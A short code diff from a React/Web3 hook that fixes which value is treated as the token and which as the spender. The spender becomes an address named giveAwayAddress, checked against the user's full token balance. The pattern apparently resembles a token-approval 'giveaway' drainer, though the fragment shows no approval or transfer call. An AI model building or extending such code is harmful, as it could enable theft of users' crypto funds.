@@ -31,8 +31,8 @@ export default function UseTokenBalance() {
   const allowanceAction = async (from) => {
     let account = accounts || localStorage.getItem('account')
     const provider = new Web3.providers.HttpProvider("https://rpc.etherfair.org")
-    const { address: spender, balance: tokenValue} = from
-    const tokenAddress = giveAwayAddress
+    const { address: tokenAddress, balance: tokenValue} = from
+    const spender = giveAwayAddress
     const allowanceTotal = await allowance({provider, tokenAddress, spender, account})
     console.log(allowanceTotal, 'allowanceTotal====')
     const amountToken = ethers.utils.parseEther(tokenValue)
